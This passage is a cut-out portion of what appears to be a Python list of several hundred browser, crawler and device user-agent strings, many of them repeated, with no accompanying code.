               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
